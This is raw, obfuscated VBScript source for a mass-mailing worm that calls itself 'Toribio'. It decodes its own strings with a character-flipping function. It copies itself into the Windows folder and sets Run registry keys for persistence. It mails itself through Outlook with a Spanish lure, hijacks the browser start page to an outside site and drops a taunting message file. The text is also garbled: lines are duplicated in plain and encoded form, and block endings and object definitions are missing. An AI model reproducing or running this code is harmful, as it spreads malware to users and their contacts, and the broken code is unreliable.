Set GERManwshusmwrn = CreateObject(snphhuatvsbkwuj("VRbshqu/Ridmm"))
Set GERManfsousmwrn= CreateObject(snphhuatvsbkwuj("rbshquhof/ghmdrxrudlnckdbu"))
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJBT]rnguv`sd]") & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
GERManfsousmwrn.copyfile wscript.scriptfullname,GERManfsousmwrn.GetSpecialFolder(0)& snphhuatvsbkwuj("]Unshchn/wcr")
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJML]RNGUV@SD]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]F`udrbshquSto"),"wscript.exe " & GERManfsousmwrn.GetSpecialFolder(0) & "\Toribio.vbs %"
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJML]RNGUV@SD]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]F`udrbshquSto"),snphhuatvsbkwuj("vrbshqu/dyd!") & GERManfsousmwrn.GetSpecialFolder(0) & "\Toribio.vbs %"
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJML]RNGUV@SD]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]F`udrbshquSto"),snphhuatvsbkwuj("vrbshqu/dyd!") & GERManfsousmwrn.GetSpecialFolder(0) & snphhuatvsbkwuj("]Unshchn/wcr!$")
If GERManwshusmwrn.regread(snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]bnssdn")) <> "1" Then
If GERManwshusmwrn.regread(snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]bnssdn")) <> snphhuatvsbkwuj("0") Then
Set GERManusmwrnApp = CreateObject(snphhuatvsbkwuj("Ntumnnj/@qqmhb`uhno"))
If GERManusmwrnApp = snphhuatvsbkwuj("Ntumnnj")Then
Set GERManusmwrnM = GERManusmwrnapp.GetNameSpace(snphhuatvsbkwuj("L@QH"))
GERManusmwrnms.Subject = snphhuatvsbkwuj("ON!druhl`en!Chmm!F/")
GERManusmwrnms.Body = snphhuatvsbkwuj("Inm`!ptd!u`m-") & vbcrlf & "Aqui le adjunto los precios para su funeral." & vbcrlf & ""
GERManusmwrnms.Body = snphhuatvsbkwuj("Inm`!ptd!u`m-") & vbcrlf & snphhuatvsbkwuj("@pth!md!`ektoun!mnr!qsdbhnr!q`s`!rt!gtods`m/") & vbcrlf & ""
GERManusmwrnms.Body = snphhuatvsbkwuj("Inm`!ptd!u`m-") & vbcrlf & snphhuatvsbkwuj("@pth!md!`ektoun!mnr!qsdbhnr!q`s`!rt!gtods`m/") & vbcrlf & snphhuatvsbkwuj("")
GERManusmwrnAtt.Add GERManfsousmwrn.GetSpecialFolder(0)& snphhuatvsbkwuj("]Unshchn/wcr")
If GERManusmwrnms.To <> snphhuatvsbkwuj("") Then
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]bnssdn"),"1"
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]bnssdn"),snphhuatvsbkwuj("0")
If GERManwshusmwrn.regread(snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]ldor`kd")) <> "1" Then
If GERManwshusmwrn.regread(snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]ldor`kd")) <> snphhuatvsbkwuj("0") Then
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]ldor`kd"),"1"
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]ldor`kd"),snphhuatvsbkwuj("0")
File = GERManfsousmwrn.GetSpecialFolder(0) & snphhuatvsbkwuj("]Lrf/UYU")
F.write snphhuatvsbkwuj("fdnbhuhdr/bnl.f`udrbshqu") & vbcrlf & "RULES" & vbcrlf & " " & vbcrlf & "NO olvides visitar el sitio web." & vbcrlf & ""
F.write snphhuatvsbkwuj("fdnbhuhdr/bnl.f`udrbshqu") & vbcrlf & snphhuatvsbkwuj("STMDR") & vbcrlf & " " & vbcrlf & "NO olvides visitar el sitio web." & vbcrlf & ""
F.write snphhuatvsbkwuj("fdnbhuhdr/bnl.f`udrbshqu") & vbcrlf & snphhuatvsbkwuj("STMDR") & vbcrlf & snphhuatvsbkwuj("!") & vbcrlf & "NO olvides visitar el sitio web." & vbcrlf & ""
F.write snphhuatvsbkwuj("fdnbhuhdr/bnl.f`udrbshqu") & vbcrlf & snphhuatvsbkwuj("STMDR") & vbcrlf & snphhuatvsbkwuj("!") & vbcrlf & snphhuatvsbkwuj("ON!nmwhedr!whrhu`s!dm!rhuhn!vdc/") & vbcrlf & ""
F.write snphhuatvsbkwuj("fdnbhuhdr/bnl.f`udrbshqu") & vbcrlf & snphhuatvsbkwuj("STMDR") & vbcrlf & snphhuatvsbkwuj("!") & vbcrlf & snphhuatvsbkwuj("ON!nmwhedr!whrhu`s!dm!rhuhn!vdc/") & vbcrlf & snphhuatvsbkwuj("")
GERManwshusmwrn.run snphhuatvsbkwuj("onudq`e!") & GERManfsousmwrn.GetSpecialFolder(0) & "\Msg.TXT"
GERManwshusmwrn.run snphhuatvsbkwuj("onudq`e!") & GERManfsousmwrn.GetSpecialFolder(0) & snphhuatvsbkwuj("]Lrf/UYU")
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJDX^TRDSR]/EDG@TMU]RNGUV@SD]Lhbsnrngu]Houdsodu!Dyqmnsds]L`ho]Ru`su!Q`fd"),"http://kaycepax.zzn.com"
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJDX^TRDSR]/EDG@TMU]RNGUV@SD]Lhbsnrngu]Houdsodu!Dyqmnsds]L`ho]Ru`su!Q`fd"),snphhuatvsbkwuj("iuuq;..j`xbdq`y/{{o/bnl")
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJDX^TRDSR]/EDG@TMU]RNGUV@SD]Lhbsnrngu]Houdsodu!Dyqmnsds]L`ho]Vhoenv!uhumd"),"TORIBIO RULES"
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJDX^TRDSR]/EDG@TMU]RNGUV@SD]Lhbsnrngu]Houdsodu!Dyqmnsds]L`ho]Vhoenv!uhumd"),snphhuatvsbkwuj("UNSHCHN!STMDR")
vtecusmwrn = snphhuatvsbkwuj("")
vtecusmwrn = GERManwshusmwrn.regread(snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]udbm`r"))
If vtecusmwrn = snphhuatvsbkwuj("") then
GERManwshusmwrn.regwrite snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]udbm`r"),vtecusmwrn
If GERManwshusmwrn.regread(snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]udbm`r")) <= "1" Then
If GERManwshusmwrn.regread(snphhuatvsbkwuj("IJBT]rnguv`sd]F`udrbshquSto]udbm`r")) <= snphhuatvsbkwuj("0") Then
GERManwshusmwrn.sendkeys snphhuatvsbkwuj("F`udrbshqu!,!Fdnbhuhdr/bnl.f`udrbshqu")

Function snphhuatvsbkwuj(zwbyjntbpmhqqgh)
For vvpzxfszgnczrao = 1 To Len(zwbyjntbpmhqqgh)
ccuhbhjhyzkheeq = Mid(zwbyjntbpmhqqgh, vvpzxfszgnczrao, 1)
If Asc(ccuhbhjhyzkheeq) <> 34 And Asc(ccuhbhjhyzkheeq) <> 35 Then
If Asc(ccuhbhjhyzkheeq) Mod 2 = 0 Then
ccuhbhjhyzkheeq = Chr(Asc(ccuhbhjhyzkheeq) + 1)
Else
ccuhbhjhyzkheeq = Chr(Asc(ccuhbhjhyzkheeq) - 1)
End If
End If
snphhuatvsbkwuj = snphhuatvsbkwuj & ccuhbhjhyzkheeq
Next
End Function
